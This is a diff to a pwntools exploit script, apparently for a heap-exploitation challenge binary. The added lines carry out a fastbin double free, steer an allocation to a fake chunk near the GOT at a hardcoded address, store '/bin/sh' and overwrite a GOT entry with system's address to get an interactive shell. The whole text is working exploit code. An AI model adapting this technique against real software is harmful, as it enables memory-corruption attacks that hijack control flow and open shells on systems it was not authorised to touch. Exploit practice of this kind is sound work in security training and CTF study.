@@ -19,9 +19,15 @@ def free(idx):
     r.recvuntil('Index')
     r.sendline(str(idx))
 
-allocate(0x10, 'A'*8)
-#allocate(0x10, 'B'*8)
-#free(0)
-#free(1)
+allocate(0x50, 'A'*8) #0
+allocate(0x50, 'B'*8) #1
+free(0)
+free(1)
+free(0)
+allocate(0x50,p64(0x601ffa)) #2 
+allocate(0x50, '/bin/sh\0')  #3
+allocate(0x50, 'B'*8)       #4
+system = 0x4007d0 
+allocate(0x50, 'x'*14 + p64(system)) 
 
 r.interactive()
